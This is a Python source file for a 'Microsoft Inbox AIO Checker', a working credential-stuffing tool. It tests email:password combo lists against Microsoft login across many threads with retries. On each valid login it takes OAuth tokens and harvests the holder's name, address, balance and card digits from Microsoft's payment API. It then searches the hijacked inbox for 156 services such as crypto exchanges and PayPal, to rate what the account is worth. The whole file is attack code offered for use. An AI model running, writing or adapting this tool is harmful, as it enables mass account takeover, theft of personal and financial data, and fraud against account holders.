"""
Microsoft Inbox AIO Checker — Python port of microsoft-inbox.js.
Logs into Hotmail/Outlook, searches inbox for 156 services.
"""
import re
import json
import time
import requests
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
MAX_RETRIES = 3
RETRY_DELAY = 2

AUTHORIZE_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=0000000048170EF2"
    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
    "&response_type=token"
    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
    "&display=touch"
)

COMMON_HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
}

# ── Service definitions (156 services) ──
SERVICES = [
    # Streaming
    {"keyword": "netflix", "label": "Netflix", "category": "Streaming"},
    {"keyword": "disney+", "label": "Disney+", "category": "Streaming"},
    {"keyword": "hulu", "label": "Hulu", "category": "Streaming"},
    {"keyword": "hbo max", "label": "HBO Max", "category": "Streaming"},
    {"keyword": "amazon prime", "label": "Amazon Prime", "category": "Streaming"},
    {"keyword": "paramount+", "label": "Paramount+", "category": "Streaming"},
    {"keyword": "peacock", "label": "Peacock", "category": "Streaming"},
    {"keyword": "apple tv", "label": "Apple TV+", "category": "Streaming"},
    {"keyword": "crunchyroll", "label": "Crunchyroll", "category": "Streaming"},
    {"keyword": "funimation", "label": "Funimation", "category": "Streaming"},
    {"keyword": "youtube premium", "label": "YouTube Premium", "category": "Streaming"},
    {"keyword": "dazn", "label": "DAZN", "category": "Streaming"},
    {"keyword": "curiositystream", "label": "CuriosityStream", "category": "Streaming"},
    {"keyword": "mubi", "label": "MUBI", "category": "Streaming"},
    {"keyword": "shudder", "label": "Shudder", "category": "Streaming"},
    {"keyword": "britbox", "label": "BritBox", "category": "Streaming"},
    {"keyword": "starz", "label": "Starz", "category": "Streaming"},
    {"keyword": "showtime", "label": "Showtime", "category": "Streaming"},
    {"keyword": "pluto tv", "label": "Pluto TV", "category": "Streaming"},
    {"keyword": "tubi", "label": "Tubi", "category": "Streaming"},
    {"keyword": "vudu", "label": "Vudu", "category": "Streaming"},
    {"keyword": "plex", "label": "Plex", "category": "Streaming"},
    # Music
    {"keyword": "spotify", "label": "Spotify", "category": "Music"},
    {"keyword": "apple music", "label": "Apple Music", "category": "Music"},
    {"keyword": "tidal", "label": "Tidal", "category": "Music"},
    {"keyword": "deezer", "label": "Deezer", "category": "Music"},
    {"keyword": "soundcloud", "label": "SoundCloud", "category": "Music"},
    {"keyword": "pandora", "label": "Pandora", "category": "Music"},
    {"keyword": "audiomack", "label": "Audiomack", "category": "Music"},
    {"keyword": "amazon music", "label": "Amazon Music", "category": "Music"},
    {"keyword": "bandcamp", "label": "Bandcamp", "category": "Music"},
    # Gaming
    {"keyword": "roblox", "label": "Roblox", "category": "Gaming"},
    {"keyword": "steam", "label": "Steam", "category": "Gaming"},
    {"keyword": "epic games", "label": "Epic Games", "category": "Gaming"},
    {"keyword": "riot games", "label": "Riot Games", "category": "Gaming"},
    {"keyword": "playstation", "label": "PlayStation", "category": "Gaming"},
    {"keyword": "xbox", "label": "Xbox", "category": "Gaming"},
    {"keyword": "ea.com", "label": "EA", "category": "Gaming"},
    {"keyword": "ubisoft", "label": "Ubisoft", "category": "Gaming"},
    {"keyword": "activision", "label": "Activision", "category": "Gaming"},
    {"keyword": "minecraft", "label": "Minecraft", "category": "Gaming"},
    {"keyword": "blizzard", "label": "Blizzard", "category": "Gaming"},
    {"keyword": "rockstar games", "label": "Rockstar Games", "category": "Gaming"},
    {"keyword": "bethesda", "label": "Bethesda", "category": "Gaming"},
    {"keyword": "nintendo", "label": "Nintendo", "category": "Gaming"},
    {"keyword": "gog.com", "label": "GOG", "category": "Gaming"},
    {"keyword": "humble bundle", "label": "Humble Bundle", "category": "Gaming"},
    {"keyword": "twitch", "label": "Twitch", "category": "Gaming"},
    {"keyword": "origin", "label": "Origin/EA", "category": "Gaming"},
    {"keyword": "valorant", "label": "Valorant", "category": "Gaming"},
    {"keyword": "fortnite", "label": "Fortnite", "category": "Gaming"},
    {"keyword": "apex legends", "label": "Apex Legends", "category": "Gaming"},
    {"keyword": "genshin", "label": "Genshin Impact", "category": "Gaming"},
    {"keyword": "mihoyo", "label": "miHoYo/HoYoverse", "category": "Gaming"},
    # Shopping
    {"keyword": "paypal", "label": "PayPal", "category": "Shopping"},
    {"keyword": "amazon.com", "label": "Amazon", "category": "Shopping"},
    {"keyword": "ebay", "label": "eBay", "category": "Shopping"},
    {"keyword": "walmart", "label": "Walmart", "category": "Shopping"},
    {"keyword": "shopify", "label": "Shopify", "category": "Shopping"},
    {"keyword": "aliexpress", "label": "AliExpress", "category": "Shopping"},
    {"keyword": "stripe", "label": "Stripe", "category": "Shopping"},
    {"keyword": "cash app", "label": "Cash App", "category": "Shopping"},
    {"keyword": "venmo", "label": "Venmo", "category": "Shopping"},
    {"keyword": "zelle", "label": "Zelle", "category": "Shopping"},
    {"keyword": "etsy", "label": "Etsy", "category": "Shopping"},
    {"keyword": "wish", "label": "Wish", "category": "Shopping"},
    {"keyword": "best buy", "label": "Best Buy", "category": "Shopping"},
    {"keyword": "target", "label": "Target", "category": "Shopping"},
    {"keyword": "nike", "label": "Nike", "category": "Shopping"},
    {"keyword": "adidas", "label": "Adidas", "category": "Shopping"},
    {"keyword": "shein", "label": "SHEIN", "category": "Shopping"},
    {"keyword": "stockx", "label": "StockX", "category": "Shopping"},
    {"keyword": "grubhub", "label": "Grubhub", "category": "Shopping"},
    {"keyword": "doordash", "label": "DoorDash", "category": "Shopping"},
    {"keyword": "uber eats", "label": "Uber Eats", "category": "Shopping"},
    {"keyword": "instacart", "label": "Instacart", "category": "Shopping"},
    # Social
    {"keyword": "facebook", "label": "Facebook", "category": "Social"},
    {"keyword": "instagram", "label": "Instagram", "category": "Social"},
    {"keyword": "twitter", "label": "Twitter/X", "category": "Social"},
    {"keyword": "tiktok", "label": "TikTok", "category": "Social"},
    {"keyword": "snapchat", "label": "Snapchat", "category": "Social"},
    {"keyword": "discord", "label": "Discord", "category": "Social"},
    {"keyword": "telegram", "label": "Telegram", "category": "Social"},
    {"keyword": "reddit", "label": "Reddit", "category": "Social"},
    {"keyword": "linkedin", "label": "LinkedIn", "category": "Social"},
    {"keyword": "pinterest", "label": "Pinterest", "category": "Social"},
    {"keyword": "tumblr", "label": "Tumblr", "category": "Social"},
    {"keyword": "whatsapp", "label": "WhatsApp", "category": "Social"},
    {"keyword": "signal", "label": "Signal", "category": "Social"},
    {"keyword": "wechat", "label": "WeChat", "category": "Social"},
    {"keyword": "line", "label": "LINE", "category": "Social"},
    {"keyword": "viber", "label": "Viber", "category": "Social"},
    {"keyword": "clubhouse", "label": "Clubhouse", "category": "Social"},
    {"keyword": "mastodon", "label": "Mastodon", "category": "Social"},
    {"keyword": "threads", "label": "Threads", "category": "Social"},
    {"keyword": "bluesky", "label": "Bluesky", "category": "Social"},
    # Cloud
    {"keyword": "dropbox", "label": "Dropbox", "category": "Cloud"},
    {"keyword": "google drive", "label": "Google Drive", "category": "Cloud"},
    {"keyword": "icloud", "label": "iCloud", "category": "Cloud"},
    {"keyword": "notion", "label": "Notion", "category": "Cloud"},
    {"keyword": "zoom", "label": "Zoom", "category": "Cloud"},
    {"keyword": "canva", "label": "Canva", "category": "Cloud"},
    {"keyword": "adobe", "label": "Adobe", "category": "Cloud"},
    {"keyword": "github", "label": "GitHub", "category": "Cloud"},
    {"keyword": "gitlab", "label": "GitLab", "category": "Cloud"},
    {"keyword": "slack", "label": "Slack", "category": "Cloud"},
    {"keyword": "trello", "label": "Trello", "category": "Cloud"},
    {"keyword": "asana", "label": "Asana", "category": "Cloud"},
    {"keyword": "figma", "label": "Figma", "category": "Cloud"},
    {"keyword": "grammarly", "label": "Grammarly", "category": "Cloud"},
    {"keyword": "evernote", "label": "Evernote", "category": "Cloud"},
    {"keyword": "microsoft 365", "label": "Microsoft 365", "category": "Cloud"},
    {"keyword": "google workspace", "label": "Google Workspace", "category": "Cloud"},
    {"keyword": "heroku", "label": "Heroku", "category": "Cloud"},
    {"keyword": "vercel", "label": "Vercel", "category": "Cloud"},
    {"keyword": "cloudflare", "label": "Cloudflare", "category": "Cloud"},
    {"keyword": "digitalocean", "label": "DigitalOcean", "category": "Cloud"},
    {"keyword": "aws", "label": "AWS", "category": "Cloud"},
    {"keyword": "chatgpt", "label": "ChatGPT", "category": "Cloud"},
    {"keyword": "openai", "label": "OpenAI", "category": "Cloud"},
    {"keyword": "midjourney", "label": "Midjourney", "category": "Cloud"},
    # Crypto
    {"keyword": "coinbase", "label": "Coinbase", "category": "Crypto"},
    {"keyword": "binance", "label": "Binance", "category": "Crypto"},
    {"keyword": "crypto.com", "label": "Crypto.com", "category": "Crypto"},
    {"keyword": "kraken", "label": "Kraken", "category": "Crypto"},
    {"keyword": "gemini", "label": "Gemini", "category": "Crypto"},
    {"keyword": "robinhood", "label": "Robinhood", "category": "Crypto"},
    {"keyword": "metamask", "label": "MetaMask", "category": "Crypto"},
    {"keyword": "trust wallet", "label": "Trust Wallet", "category": "Crypto"},
    {"keyword": "phantom wallet", "label": "Phantom", "category": "Crypto"},
    {"keyword": "opensea", "label": "OpenSea", "category": "Crypto"},
    {"keyword": "bybit", "label": "Bybit", "category": "Crypto"},
    {"keyword": "kucoin", "label": "KuCoin", "category": "Crypto"},
    {"keyword": "uniswap", "label": "Uniswap", "category": "Crypto"},
    {"keyword": "ledger", "label": "Ledger", "category": "Crypto"},
    # Travel
    {"keyword": "uber", "label": "Uber", "category": "Travel"},
    {"keyword": "lyft", "label": "Lyft", "category": "Travel"},
    {"keyword": "airbnb", "label": "Airbnb", "category": "Travel"},
    {"keyword": "booking.com", "label": "Booking.com", "category": "Travel"},
    {"keyword": "expedia", "label": "Expedia", "category": "Travel"},
    {"keyword": "tripadvisor", "label": "TripAdvisor", "category": "Travel"},
    {"keyword": "southwest airlines", "label": "Southwest", "category": "Travel"},
    {"keyword": "united airlines", "label": "United Airlines", "category": "Travel"},
    {"keyword": "delta airlines", "label": "Delta Airlines", "category": "Travel"},
    # Education
    {"keyword": "coursera", "label": "Coursera", "category": "Education"},
    {"keyword": "udemy", "label": "Udemy", "category": "Education"},
    {"keyword": "skillshare", "label": "Skillshare", "category": "Education"},
    {"keyword": "duolingo", "label": "Duolingo", "category": "Education"},
    {"keyword": "khan academy", "label": "Khan Academy", "category": "Education"},
    {"keyword": "codecademy", "label": "Codecademy", "category": "Education"},
    {"keyword": "linkedin learning", "label": "LinkedIn Learning", "category": "Education"},
    {"keyword": "masterclass", "label": "MasterClass", "category": "Education"},
    # VPN / Security
    {"keyword": "nordvpn", "label": "NordVPN", "category": "VPN"},
    {"keyword": "expressvpn", "label": "ExpressVPN", "category": "VPN"},
    {"keyword": "surfshark", "label": "Surfshark", "category": "VPN"},
    {"keyword": "protonvpn", "label": "ProtonVPN", "category": "VPN"},
    {"keyword": "protonmail", "label": "ProtonMail", "category": "VPN"},
    {"keyword": "1password", "label": "1Password", "category": "VPN"},
    {"keyword": "lastpass", "label": "LastPass", "category": "VPN"},
    {"keyword": "bitwarden", "label": "Bitwarden", "category": "VPN"},
    {"keyword": "dashlane", "label": "Dashlane", "category": "VPN"},
    {"keyword": "malwarebytes", "label": "Malwarebytes", "category": "VPN"},
    {"keyword": "norton", "label": "Norton", "category": "VPN"},
    {"keyword": "mcafee", "label": "McAfee", "category": "VPN"},
    # Dating
    {"keyword": "tinder", "label": "Tinder", "category": "Dating"},
    {"keyword": "bumble", "label": "Bumble", "category": "Dating"},
    {"keyword": "hinge", "label": "Hinge", "category": "Dating"},
    {"keyword": "match.com", "label": "Match.com", "category": "Dating"},
    {"keyword": "okcupid", "label": "OkCupid", "category": "Dating"},
    # Health
    {"keyword": "myfitnesspal", "label": "MyFitnessPal", "category": "Health"},
    {"keyword": "fitbit", "label": "Fitbit", "category": "Health"},
    {"keyword": "peloton", "label": "Peloton", "category": "Health"},
    {"keyword": "headspace", "label": "Headspace", "category": "Health"},
    {"keyword": "calm", "label": "Calm", "category": "Health"},
    {"keyword": "strava", "label": "Strava", "category": "Health"},
]


def _parse_lr(text, left, right):
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except (ValueError, IndexError):
        return ""


def _find_nested_values(obj, key):
    out = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if str(k).lower() == key.lower():
                out.append(v)
            out.extend(_find_nested_values(v, key))
    elif isinstance(obj, list):
        for item in obj:
            out.extend(_find_nested_values(item, key))
    return out


def _extract_total_messages(search_json, raw_text):
    totals = []
    for val in _find_nested_values(search_json, "Total"):
        try:
            totals.append(int(str(val).strip()))
        except Exception:
            pass
    if totals:
        return max(totals)
    t = _parse_lr(raw_text, '"Total":', ',')
    if t:
        try:
            return int(t.strip())
        except Exception:
            pass
    return 0


def _attempt_check(email, password):
    result = {
        "user": email, "password": password, "status": "fail",
        "captures": {}, "services": {}, "detail": "",
    }

    session = requests.Session()
    session.max_redirects = 8

    try:
        # ── Step 1: GET login page for fresh PPFT + urlPost ──
        session.headers.update(COMMON_HEADERS)
        r0 = session.get(AUTHORIZE_URL, allow_redirects=True, timeout=15)
        page = r0.text

        ppft = _parse_lr(page, 'name="PPFT" id="i0327" value="', '"')
        if not ppft:
            ppft = _parse_lr(page, "sFT:'", "'")
        if not ppft:
            result["status"] = "retry"
            result["detail"] = "PPFT not found"
            return result

        url_post = _parse_lr(page, "urlPost:'", "'")
        if not url_post:
            url_post = _parse_lr(page, 'urlPost:"', '"')
        if not url_post:
            result["status"] = "retry"
            result["detail"] = "urlPost not found"
            return result

        # ── Step 2: POST login with fresh values ──
        post_data = (
            f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={urllib.parse.quote(ppft)}"
            f"&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
            f"&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={urllib.parse.quote(password)}"
        )

        post_headers = {
            "Host": "login.live.com", "Connection": "keep-alive", "Cache-Control": "max-age=0",
            "Origin": "https://login.live.com", "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
            "Referer": str(r0.url), "Upgrade-Insecure-Requests": "1",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
        }

        resp = session.post(url_post, headers=post_headers, data=post_data,
                            allow_redirects=True, timeout=20)
        body = resp.text
        final_url = str(resp.url)
        cookies_str = str(session.cookies.get_dict())

        if any(x in body for x in [
            "Your account or password is incorrect",
            "That Microsoft account doesn\\'t exist",
            "That Microsoft account doesn't exist",
            "Sign in to your Microsoft account", "timed out"
        ]):
            result["status"] = "fail"
            result["detail"] = "bad credentials"
            return result

        if ",AC:null,urlFedConvertRename" in body:
            result["status"] = "retry"
            result["detail"] = "ban/rate limit"
            return result

        if any(x in body for x in ["account.live.com/recover?mkt", "recover?mkt",
                                    "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"]):
            result["status"] = "2fa"
            result["detail"] = "2FA/recovery"
            return result

        if "/cancel?mkt=" in body or "/Abuse?mkt=" in body:
            result["status"] = "locked"
            result["detail"] = "locked/abuse"
            return result

        if ("ANON" in cookies_str or "WLSSC" in cookies_str) and \
           "https://login.live.com/oauth20_desktop.srf?" in final_url:
            result["status"] = "hit"
        else:
            result["status"] = "fail"
            result["detail"] = "login failed"
            return result

        # Get access token
        access_token = ""
        refresh_token = _parse_lr(final_url, "refresh_token=", "&")
        if not refresh_token:
            refresh_token = _parse_lr(body, "refresh_token=", "&")

        if refresh_token:
            try:
                token_data = (
                    "grant_type=refresh_token&client_id=0000000048170EF2"
                    "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                    f"&refresh_token={refresh_token}"
                    "&uaid=db28da170f2a4b85a26388d0a6cdbb6e"
                )
                tr = session.post("https://login.live.com/oauth20_token.srf", data=token_data,
                                  headers={"x-ms-sso-Ignore-SSO": "1", "User-Agent": "Outlook-Android/2.0",
                                           "Content-Type": "application/x-www-form-urlencoded"},
                                  timeout=15)
                access_token = tr.json().get("access_token", "")
            except Exception:
                pass

        # Get PIFD token for payment
        pifd_token = ""
        try:
            pr = session.get(
                "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token"
                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                         "Referer": "https://account.microsoft.com/"},
                allow_redirects=True, timeout=15,
            )
            pifd_token = _parse_lr(str(pr.url), "access_token=", "&token_type")
            if not pifd_token:
                pifd_token = _parse_lr(str(pr.url), "access_token=", "&")
            if pifd_token:
                pifd_token = urllib.parse.unquote(pifd_token)
        except Exception:
            pass

        # Payment captures
        if pifd_token:
            try:
                pay_r = session.get(
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
                    headers={"Authorization": f'MSADELEGATE1.0="{pifd_token}"',
                             "Accept": "application/json", "Content-Type": "application/json",
                             "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"},
                    timeout=15,
                )
                pb = pay_r.text
                name = _parse_lr(pb, '"accountHolderName":"', '"')
                if name:
                    result["captures"]["Name"] = name
                addr1 = _parse_lr(pb, '"address":{"address_line1":"', '"')
                city = _parse_lr(pb, '"city":"', '"')
                region = _parse_lr(pb, '"region":"', '"')
                zipcode = _parse_lr(pb, '"postal_code":"', '"')
                if addr1 or city:
                    result["captures"]["Address"] = f"{addr1} | {city} | {region} | {zipcode}"
                balance = _parse_lr(pb, 'balance":', ',"')
                if balance:
                    result["captures"]["Balance"] = f"${balance}"
                last4 = _parse_lr(pb, '"lastFourDigits":"', '",')
                card_type = _parse_lr(pb, '"cardType":"', '"')
                if last4:
                    result["captures"]["CC"] = f"****{last4} ({card_type})"
            except Exception:
                pass

        # Search inbox for ALL services
        anchor = f"CID:{refresh_token}" if refresh_token else ""
        if access_token and access_token.startswith("Ew"):
            mail_headers = {
                "User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache",
                "Accept": "application/json", "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": anchor,
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
            }

            for svc in SERVICES:
                try:
                    search_body = {
                        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "UTC", "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation", "ContentSources": ["Exchange"],
                            "Filter": {"Or": [
                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                            ]},
                            "From": 0, "Query": {"QueryString": svc["keyword"]},
                            "Size": 25,
                            "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                     {"Field": "Time", "SortDirection": "Desc"}],
                            "EnableTopResults": True, "TopResultsCount": 3,
                        }],
                        "AnswerEntityRequests": [{
                            "Query": {"QueryString": svc["keyword"]},
                            "EntityTypes": ["Event", "File"], "From": 0, "Size": 10,
                            "EnableAsyncResolution": True,
                        }],
                        "QueryAlterationOptions": {
                            "EnableSuggestion": True, "EnableAlteration": True,
                            "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification",
                                                               "NoResultFolderRefinerModification",
                                                               "NoRequeryModification", "Modification"],
                        },
                    }

                    sr = session.post("https://outlook.live.com/search/api/v2/query?n=124",
                                      json=search_body,
                                      headers={**mail_headers, "Content-Type": "application/json"},
                                      timeout=10)
                    search_text = sr.text
                    search_json = {}
                    try:
                        search_json = json.loads(search_text)
                    except Exception:
                        pass

                    total_msgs = _extract_total_messages(search_json, search_text)

                    if total_msgs > 0:
                        snippet = ""
                        for key in ["HitHighlightedSummary", "Summary", "Preview", "Snippet"]:
                            vals = _find_nested_values(search_json, key)
                            for v in vals:
                                if isinstance(v, str) and v.strip():
                                    snippet = v.strip()
                                    break
                            if snippet:
                                break
                        if snippet:
                            snippet = re.sub(r'\[.*?\]', '', snippet).strip()[:120]

                        last_date = ""
                        for key in ["LastDeliveryTime", "ReceivedDateTime", "DateTimeSent"]:
                            vals = _find_nested_values(search_json, key)
                            for v in vals:
                                if isinstance(v, str) and v.strip():
                                    last_date = v.strip()
                                    break
                            if last_date:
                                break
                        if last_date and "T" in last_date:
                            last_date = last_date.split("T")[0]

                        result["services"][svc["label"]] = {
                            "found": True, "count": total_msgs,
                            "snippet": snippet, "date": last_date,
                            "category": svc["category"],
                        }
                except Exception:
                    pass

    except Exception as ex:
        err = str(ex)
        if "timed out" in err.lower() or "timeout" in err.lower():
            result["status"] = "retry"
            result["detail"] = "timed out"
        elif "fetch failed" in err.lower() or "connection" in err.lower():
            result["status"] = "retry"
            result["detail"] = "connection error"
        else:
            result["status"] = "fail"
            result["detail"] = err[:100]

    return result


def check_single_account(email, password):
    for attempt in range(MAX_RETRIES):
        result = _attempt_check(email, password)
        if result["status"] == "retry":
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            result["status"] = "fail"
            result["detail"] = f"retry exhausted ({result['detail']})"
        return result
    return result


def check_inbox_accounts(accounts, threads=5, on_progress=None, stop_event=None):
    results = []
    lock = threading.Lock()
    idx = [0]
    hit_count = [0]
    fail_count = [0]

    def worker():
        while True:
            if stop_event and stop_event.is_set():
                break
            with lock:
                i = idx[0]
                idx[0] += 1
            if i >= len(accounts):
                break
            combo = accounts[i]
            parts = combo.split(":", 1)
            if len(parts) < 2 or not parts[0].strip() or not parts[1].strip():
                r = {"user": parts[0].strip() if parts else combo, "password": "",
                     "status": "fail", "captures": {}, "services": {}, "detail": "invalid format"}
                with lock:
                    results.append(r)
                    fail_count[0] += 1
                if on_progress:
                    on_progress(len(results), len(accounts), r["status"], hit_count[0], fail_count[0], r)
                continue

            email = parts[0].strip()
            password = parts[1].strip()
            r = check_single_account(email, password)
            with lock:
                results.append(r)
                if r["status"] == "hit":
                    hit_count[0] += 1
                else:
                    fail_count[0] += 1
            if on_progress:
                try:
                    on_progress(len(results), len(accounts), r["status"], hit_count[0], fail_count[0], r)
                except Exception:
                    try:
                        on_progress(len(results), len(accounts))
                    except Exception:
                        pass

    concurrency = min(threads, 50, len(accounts))
    workers = []
    for _ in range(concurrency):
        t = threading.Thread(target=worker)
        t.start()
        workers.append(t)
    for t in workers:
        t.join()
    return results


def get_service_list():
    return SERVICES


def get_service_count():
    return len(SERVICES)
